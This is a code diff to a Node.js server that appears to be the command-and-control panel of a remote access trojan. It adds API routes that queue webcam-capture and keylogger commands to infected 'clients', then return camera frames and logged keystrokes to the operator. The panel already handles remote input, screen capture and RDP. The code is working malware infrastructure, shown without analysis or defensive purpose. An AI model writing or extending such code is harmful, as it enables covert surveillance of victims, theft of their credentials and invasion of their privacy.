@@ -15,7 +15,7 @@ import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
-import { startUdp, sendInput, sendCfg, getFrame, getMonitors } from './net.js';
+import { startUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
@@ -39,6 +39,8 @@ if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
 }
 if (!fs.existsSync(CFG.tlsCert) || !fs.existsSync(CFG.tlsKey)) {
   console.error(`[startup] FATAL: TLS cert/key missing.`);
+  console.error(`  cert: ${CFG.tlsCert}`);
+  console.error(`  key : ${CFG.tlsKey}`);
   process.exit(1);
 }
 
@@ -104,7 +106,14 @@ const limitGlobal = limit({
     req.path.endsWith('/monitors') ||
     req.path.endsWith('/rdp/start') ||
     req.path.endsWith('/rdp/stop') ||
-    req.path.endsWith('/rdp/update'),
+    req.path.endsWith('/rdp/update') ||
+    req.path.endsWith('/webcam') ||
+    req.path.endsWith('/webcam/start') ||
+    req.path.endsWith('/webcam/stop') ||
+    req.path.endsWith('/webcam/list') ||
+    req.path.endsWith('/keylog') ||
+    req.path.endsWith('/keylog/start') ||
+    req.path.endsWith('/keylog/stop'),
 });
 const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
 const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
@@ -168,6 +177,7 @@ app.get('/api/health', (_req, res) => {
              time: new Date().toISOString() });
 });
 
+// ---------- auth ----------
 app.post('/api/signup', limitAuth, async (req, res) => {
   const { username, email, password, discordWebhook } = req.body || {};
   if (!username || !email || !password || !discordWebhook)
@@ -263,6 +273,7 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   res.json({ ok: true });
 });
 
+// ---------- clients ----------
 app.get('/api/clients', requireAuth, (req, res) => {
   const status = String(req.query.status || 'all').toLowerCase();
   const q      = String(req.query.q || '').trim();
@@ -441,9 +452,108 @@ app.post('/api/clients/:id/input', requireAuth, (req, res) => {
   res.json({ ok });
 });
 
+// ---------- webcam ----------
+app.post('/api/clients/:id/webcam/start', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+
+  const cfg = {
+    camera:  Number(req.body.camera  || 0),
+    width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
+    height:  Math.min(Math.max(Number(req.body.height || 480), 120), 1080),
+    quality: Math.min(Math.max(Number(req.body.quality || 55),  10),  90),
+    fps:     Math.min(Math.max(Number(req.body.fps     || 10),   1),  30),
+  };
+
+  db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'webcam', ?, 'pending', ?)
+  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
+
+  res.json({ ok: true });
+});
+
+app.post('/api/clients/:id/webcam/stop', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
+  `).run(req.user.uid, cid, Date.now());
+  res.json({ ok: true });
+});
+
+app.post('/api/clients/:id/webcam/list', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'webcam', '{"list":true}', 'pending', ?)
+  `).run(req.user.uid, cid, Date.now());
+  res.json({ ok: true });
+});
+
+app.get('/api/clients/:id/webcam', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  const jpeg = getWebcamFrame(cid);
+  if (!jpeg) return res.status(204).end();
+  res.setHeader('Content-Type', 'image/jpeg');
+  res.setHeader('Cache-Control', 'no-store');
+  res.send(jpeg);
+});
+
+// ---------- keylog ----------
+app.post('/api/clients/:id/keylog/start', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'keylog', '{"start":true}', 'pending', ?)
+  `).run(req.user.uid, cid, Date.now());
+  res.json({ ok: true });
+});
+
+app.post('/api/clients/:id/keylog/stop', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  db.prepare(sql`
+    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
+    VALUES (?, ?, 'keylog', '{"stop":true}', 'pending', ?)
+  `).run(req.user.uid, cid, Date.now());
+  res.json({ ok: true });
+});
+
+app.get('/api/clients/:id/keylog', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  const rows = db.prepare(sql`
+    SELECT id, data, created_at FROM keylogs
+    WHERE user_id = ? AND client_id = ?
+    ORDER BY created_at DESC LIMIT 500
+  `).all(req.user.uid, cid);
+  res.json(rows.reverse());
+});
+
+app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
+  const cid = Number(req.params.id);
+  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
+  if (!client) return res.status(404).json({ error: 'client not found' });
+  db.prepare(sql`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`).run(req.user.uid, cid);
+  res.json({ ok: true });
+});
+
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
+// ---------- listeners ----------
 const udpSock = startUdp({
   host: CFG.bindHost, port: CFG.udpPort,
   onMsg: (text, rinfo, s) => {
